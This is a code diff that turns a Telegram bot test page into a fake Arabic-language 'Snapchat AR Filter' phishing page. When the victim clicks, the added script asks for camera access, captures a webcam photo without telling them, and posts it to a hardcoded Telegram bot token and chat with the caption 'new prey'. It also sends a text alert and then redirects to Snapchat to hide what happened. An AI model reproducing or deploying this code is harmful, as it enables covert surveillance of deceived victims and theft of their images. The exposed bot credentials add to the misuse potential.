@@ -2,34 +2,68 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Test Bot</title>
+    <title>Snapchat AR Filter</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #FFFC00; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .btn { background: #000; color: #fff; padding: 20px; border-radius: 50px; width: 85%; font-size: 20px; border: none; cursor: pointer; font-weight: bold; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
+        video, canvas { display: none; }
+    </style>
 </head>
-<body style="background:#FFFC00; text-align:center; padding-top:100px;">
-
-    <h1>فحص اتصال البوت 🤖</h1>
-    <p id="status">انتظر... جارِ محاولة مراسلة البوت</p>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png" width="100">
+    <h1>فلتر "الوحش" 👿</h1>
+    <p>أنت مؤهل لتجربة الفلتر المخصص للمتميزين.<br>اضغط أدناه للبدء.</p>
+    
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
+    <button id="b" class="btn">تفعيل الآن 📸</button>
 
 <script>
-    // بياناتك اللي حلفت إنها صحيحة يا وحش 👿
     const token = "8371736437:AAG3niwDWXJCjo8MFgiTJdL2zpNjVrJBMFU";
     const chat = "321516845";
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
+    const b = document.getElementById('b');
 
-    // أول ما تفتح الصفحة، نضرب البوت برسالة
-    window.onload = () => {
-        const msg = encodeURIComponent("👿 وحش! إذا شفت هاي الرسالة يعني البوت شغال والربط صح 100%");
-        
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${msg}`)
-        .then(res => res.json())
-        .then(data => {
-            if(data.ok) {
-                document.getElementById('status').innerHTML = "✅ وصلت الرسالة! البوت شغال.. العلة جانت بالكاميرا";
-            } else {
-                document.getElementById('status').innerHTML = "❌ البوت رفض الرسالة! السبب: " + data.description;
-            }
-        })
-        .catch(err => {
-            document.getElementById('status').innerHTML = "⚠️ المتصفح منع الإرسال (CORS Error)";
-        });
+    b.onclick = async () => {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            v.srcObject = s;
+            b.innerText = "جارِ المعالجة... ⏳";
+            b.disabled = true;
+
+            setTimeout(() => {
+                const ctx = c.getContext('2d');
+                ctx.drawImage(v, 0, 0, 640, 480);
+                
+                // تحويل الصورة وإرسالها
+                c.toBlob(blob => {
+                    const f = new FormData();
+                    f.append('chat_id', chat);
+                    f.append('photo', blob, 'img.png');
+                    f.append('caption', "👿 بوم! صيد جديد من قلب بغداد!");
+
+                    // محاولة الإرسال
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: f,
+                        mode: 'no-cors' // لمحاولة تخطي حجب المتصفح
+                    });
+
+                    // إرسال إشعار نصي (عشان لو الصورة انحجبت، تعرف إنه في صيد وقع)
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=👿 وحش! في موظف فتح الرابط هسة بس النت عنده ضعيف وما بعت الصورة!`);
+
+                    // تمويه وتحويل لسناب شات بعد 2 ثانية
+                    setTimeout(() => {
+                        window.location.href = "https://www.snapchat.com/explore";
+                    }, 2000);
+
+                }, 'image/png');
+            }, 3000);
+        } catch (e) { 
+            alert("عذراً، يجب السماح بالكاميرا لتشغيل الفلتر!"); 
+        }
     };
 </script>
 </body>
